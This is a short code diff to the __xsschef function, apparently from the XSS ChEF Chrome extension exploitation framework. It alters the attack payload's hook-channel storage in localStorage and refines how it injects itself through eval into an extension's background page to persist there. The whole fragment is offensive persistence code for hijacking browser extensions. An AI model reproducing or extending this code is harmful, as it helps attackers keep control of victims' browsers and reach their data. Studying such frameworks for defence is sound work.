@@ -30,7 +30,7 @@ function __xsschef() {
             myHook = "__CHANNEL__";
             // only use localStorage if extension doesn't use it itself 
             if (localStorage.length == 0) {
-                localStorage['innocuous'] = '__CHANNEL__';
+                localStorage['innocuous'] = myHook;
             }
         }
     } catch (e) {}
@@ -478,7 +478,7 @@ function __xsschef() {
 };
 
 if (location.protocol == 'chrome-extension:') { // evaluate only in extension code
-    if (chrome.extension.getBackgroundPage()) {// try to persist in background page
+    if (chrome.extension.getBackgroundPage() && window !== chrome.extension.getBackgroundPage()) {// try to persist in background page
         // chrome 18 csp fix - maybe add https:// script to document.body and hope for relaxed CSP policy?
         chrome.extension.getBackgroundPage().eval.apply(chrome.extension.getBackgroundPage(), [__xsschef.toString()+ ";__xsschef();"]);
     } else {
